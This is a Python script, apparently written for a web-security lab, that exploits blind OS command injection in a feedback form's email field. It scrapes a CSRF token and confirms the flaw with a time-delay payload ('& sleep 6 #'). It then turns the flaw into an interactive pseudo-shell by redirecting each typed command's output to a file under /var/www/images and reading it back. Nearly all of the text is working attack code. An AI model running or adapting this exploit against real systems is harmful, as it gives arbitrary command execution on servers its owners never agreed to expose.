import requests,argparse,urllib3,sys
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# Initialize colorama for Windows support
init(autoreset=True)

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    parser.add_argument('-cookie','--cookie',
                        dest='cookie',
                        help='session cookie',
                        required=True)
    return parser.parse_args()

def banner():
    # getting rand font
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # getting rand colore
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format('os',font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple OS Command injection  Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def get_csrf_token(url,cookie):
    URL=url+'/feedback'
    try:
        r = requests.get(url=URL,verify=False,cookies=cookie,proxies=proxies)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input", {"name": "csrf"})['value']
        return csrf
    except Exception as e:
        print(colored(e,'red'))
        sys.exit(0)

def OS_command_injection(url,csrf,cookie,payload):
    
    path='/feedback/submit'
    data={
        'csrf':csrf,
        'name':'test',
        'email':f'test@gmail.com {payload}',
        'subject':'test',
        'message':'test'
    }
    header={
        'Host': str(url).replace('https://','',1),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '153',
        'Origin': url,
        'Referer': url+'/feedback',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Te': 'trailers'
    }
    try:
        r=requests.post(url=url+path,verify=False,proxies=proxies,cookies=cookie,data=data,headers=header,timeout=18)
        return r
    except Exception as e:
        print(colored(e,'red'))
        pass
        sys.exit(0)

def get_file(url,cookie):
    path='/image?filename=flag.txt'
    try:
        r= requests.get(url+path,verify=False,cookies=cookie,proxies=proxies,timeout=18)
        if r.status_code == 200:
            return r
        else:
            print(colored('Error happend','red'))
            sys.exit()
    except Exception as e:
        print(colored(e,'red'))
        sys.exit(0)

def main():

    banner()
    url=parsearg().url
    cookie=parsearg().cookie

    URL=str(url).rstrip('/')
    cookie= {'session':cookie}
    csrf=get_csrf_token(URL,cookie)
    
    print(colored('Exploiting the command injection ...','blue'))

    # To confirm whether exploitation exists or not 
    payload='& sleep 6 #'
    req_result=OS_command_injection(URL,csrf,cookie,payload)
    # Using lambda to check total seconds of request if > 6s or not
    l=lambda x:True if x.elapsed.total_seconds()>=6 else False
    resulte1= l(req_result)

    if resulte1:
        print(colored('[+] injection successful','green'))

        # execute the command whoami in the flage.txt file
        payload='& whoami > /var/www/images/flag.txt #'
        OS_command_injection(url=URL,payload=payload,csrf=csrf,cookie=cookie)

        # send a get request to confirm whether the file flag.txt created in the system or not
        file_req=get_file(url=URL,cookie=cookie)
        l=lambda x:True if x.status_code ==200 else False
        resulte2= l(file_req)

        if resulte2:
            print(colored('[+] the session is opend now ','green'))

            # creat a session for user to exist the commands
            while True:

                shell=file_req.text.strip()
                command_of_user=str(input(f'{shell} #'))

                #check if the user want to exit the session
                if command_of_user !='exit' and command_of_user!='exit()':
                    
                    # creat the pyload ex : payload = (& whoami > /var/www/images/flag.txt #)
                    payload='&'+command_of_user+' > /var/www/images/flag.txt #'

                    OS_command_injection(url=URL,payload=payload,csrf=csrf,cookie=cookie)

                    # get the output of the file
                    r=get_file(URL,cookie)
                    output=r.text.strip()
                    print(output)

                else:
                    sys.exit()
        else:
            print(colored('[+] unsuccessful open a session','red'))
    else:
        print(colored('[+] injection unsuccessful','red'))

   
if __name__=='__main__':
    main()
    